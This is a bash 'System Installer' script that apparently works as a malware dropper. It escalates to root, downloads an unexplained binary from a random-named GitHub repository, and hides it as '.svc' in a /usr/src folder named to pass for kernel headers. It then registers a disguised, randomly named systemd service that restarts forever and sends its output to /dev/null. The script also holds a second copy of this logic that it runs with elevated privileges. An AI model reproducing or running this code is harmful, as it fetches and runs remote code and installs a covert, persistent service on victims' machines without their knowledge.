#!/bin/bash
#
# System Installer - /usr/src Version
# Auto-generates folder similar to kernel headers
#

set -euo pipefail

# Config
URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3"
DEBUG="${DEBUG:-0}"

# Generate folder name similar to kernel headers
gen_folder() {
    local types=("linux-headers" "linux-hwe" "linux-modules" "linux-tools")
    local type=${types[$RANDOM % ${#types[@]}]}
    local major=$((5 + $RANDOM % 3))  # 5-7
    local minor=$((10 + $RANDOM % 10)) # 10-19
    local patch=$((0 + $RANDOM % 100)) # 0-99
    local build=$((20 + $RANDOM % 80)) # 20-99
    echo "${type}-${major}.${minor}.${patch}-${build}-generic"
}

# Generate service name
gen_service() {
    local hash=$(head -c 12 /dev/urandom 2>/dev/null | md5sum | cut -d' ' -f1 | head -c 24)
    local types=(colord upower rtkit accounts polkitd gdm)
    local type=${types[$RANDOM % ${#types[@]}]}
    echo "systemd-${hash}-${type}.service"
}

# Logging (only to file when not in debug mode)
log() {
    local msg="[$(date +'%H:%M:%S')] $*"
    echo "$msg" >> "${LOG:-/dev/null}" 2>/dev/null || true
    [ "$DEBUG" = "1" ] && echo "$msg" >&2 || true
}

die() {
    echo "ERROR: $*" >&2
    cleanup
    exit 1
}

cleanup() {
    [ -n "${SVC:-}" ] && {
        systemctl stop "$SVC" 2>/dev/null || true
        systemctl disable "$SVC" 2>/dev/null || true
        rm -f "/etc/systemd/system/${SVC}" 2>/dev/null || true
        systemctl daemon-reload 2>/dev/null || true
    }
    [ -n "${DIR:-}" ] && rm -rf "$DIR" 2>/dev/null || true
}

# Check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        log "Not root, escalating..."
        
        # Create temp script
        local tmp=$(mktemp)
        cat > "$tmp" << 'ESCALATE'
#!/bin/bash
set -euo pipefail
URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3"

gen_folder() {
    local types=("linux-headers" "linux-hwe" "linux-modules")
    local type=${types[$RANDOM % ${#types[@]}]}
    local v1=$((5 + $RANDOM % 3))
    local v2=$((10 + $RANDOM % 10))
    local v3=$((0 + $RANDOM % 100))
    local v4=$((20 + $RANDOM % 80))
    echo "${type}-${v1}.${v2}.${v3}-${v4}-generic"
}

gen_service() {
    local hash=$(head -c 12 /dev/urandom|md5sum|cut -d' ' -f1|head -c 24)
    local types=(colord upower rtkit accounts polkitd)
    local type=${types[$RANDOM % ${#types[@]}]}
    echo "systemd-${hash}-${type}.service"
}

FOLDER=$(gen_folder)
DIR="/usr/src/$FOLDER"
BIN=".svc"
SVC=$(gen_service)
SVC_FILE="/etc/systemd/system/$SVC"

mkdir -p "$DIR" || exit 1
cd "$DIR" || exit 1

if command -v curl &>/dev/null; then
    curl -fsSL --max-time 60 --retry 3 -o "$BIN" "$URL" 2>/dev/null || exit 1
else
    wget -q -t 3 -T 60 -O "$BIN" "$URL" 2>/dev/null || exit 1
fi

[ -s "$BIN" ] || exit 1
chmod +x "$BIN"

cat > "$SVC_FILE" << SVC
[Unit]
Description=System Hardware Support
After=network.target

[Service]
Type=simple
ExecStart=$DIR/$BIN
Restart=always
RestartSec=5
StartLimitInterval=60
StartLimitBurst=3
Nice=-5
CPUQuota=20%
MemoryMax=200M
PrivateTmp=yes
StandardOutput=null
StandardError=null
Environment=HOME=/root
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WorkingDirectory=$DIR

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload 2>/dev/null
systemctl enable "$SVC" 2>/dev/null
systemctl start "$SVC" 2>/dev/null

sleep 3
if systemctl is-active --quiet "$SVC" 2>/dev/null; then
    echo "OK"
    exit 0
else
    systemctl stop "$SVC" 2>/dev/null
    systemctl disable "$SVC" 2>/dev/null
    rm -f "$SVC_FILE" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -rf "$DIR" 2>/dev/null
    exit 1
fi
ESCALATE
        
        chmod +x "$tmp"
        
        if command -v sudo &>/dev/null; then
            sudo bash "$tmp"
            ret=$?
        else
            su -c "bash $tmp"
            ret=$?
        fi
        
        rm -f "$tmp" 2>/dev/null
        exit $ret
    fi
}

# Main installation
main() {
    # Try to create log file, fallback to /dev/null if fails
    LOG="/tmp/.inst_$(date +%s).log"
    touch "$LOG" 2>/dev/null || LOG="/dev/null"
    
    log "=== Installation Started ==="
    
    # Check and escalate if needed
    check_root
    
    # Suppress output if not debug
    [ "$DEBUG" != "1" ] && exec 1>/dev/null 2>/dev/null
    
    log "Running as root"
    
    # Check requirements
    command -v systemctl &>/dev/null || die "systemd not found"
    
    # Generate names
    FOLDER=$(gen_folder)
    DIR="/usr/src/$FOLDER"
    BIN=".svc"
    SVC=$(gen_service)
    SVC_FILE="/etc/systemd/system/$SVC"
    
    log "Folder: $FOLDER"
    log "Directory: $DIR"
    log "Service: $SVC"
    
    # Create directory
    mkdir -p "$DIR" || die "Failed to create $DIR"
    cd "$DIR" || die "Failed to cd to $DIR"
    
    log "Downloading binary..."
    
    # Download
    if command -v curl &>/dev/null; then
        curl -fsSL --max-time 60 --retry 3 -o "$BIN" "$URL" 2>>"$LOG" || die "Download failed"
    elif command -v wget &>/dev/null; then
        wget -q -t 3 -T 60 -O "$BIN" "$URL" 2>>"$LOG" || die "Download failed"
    else
        die "No download tool (curl/wget) available"
    fi
    
    # Verify
    [ -f "$BIN" ] || die "Binary not found"
    [ -s "$BIN" ] || die "Binary is empty"
    
    local size=$(stat -c%s "$BIN" 2>/dev/null || stat -f%z "$BIN" 2>/dev/null)
    log "Binary size: $size bytes"
    
    chmod +x "$BIN" || die "Failed to chmod"
    
    log "Creating service..."
    
    # Create service
    cat > "$SVC_FILE" << SVC
[Unit]
Description=System Hardware Support
Documentation=man:systemd(1)
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$DIR/$BIN
Restart=always
RestartSec=5
StartLimitInterval=60
StartLimitBurst=3
Nice=-5
CPUQuota=20%
MemoryMax=200M
TasksMax=50
PrivateTmp=yes
NoNewPrivileges=false
StandardOutput=null
StandardError=journal
SyslogIdentifier=hw-support
Environment=HOME=/root
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WorkingDirectory=$DIR
KillMode=mixed
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
SVC
    
    [ -f "$SVC_FILE" ] || die "Service file not created"
    
    log "Starting service..."
    
    # Start service
    systemctl daemon-reload 2>>"$LOG" || die "daemon-reload failed"
    systemctl enable "$SVC" 2>>"$LOG" || die "enable failed"
    systemctl start "$SVC" 2>>"$LOG" || die "start failed"
    
    # Wait and verify
    sleep 3
    
    for i in {1..5}; do
        if systemctl is-active --quiet "$SVC" 2>/dev/null; then
            local pid=$(systemctl show -p MainPID --value "$SVC" 2>/dev/null)
            log "Service active (PID: $pid)"
            log "=== Installation Complete ==="
            
            [ "$DEBUG" = "1" ] && {
                echo "SUCCESS"
                echo "Folder: $FOLDER"
                echo "Service: $SVC"
            }
            
            exit 0
        fi
        [ "$i" -lt 5 ] && sleep 1
    done
    
    # Failed
    log "Service failed to start"
    systemctl status "$SVC" >> "$LOG" 2>&1 || true
    die "Service did not start"
}

# Trap errors
trap 'echo "Installation failed" >&2; cleanup; exit 1' ERR

# Run
main "$@"
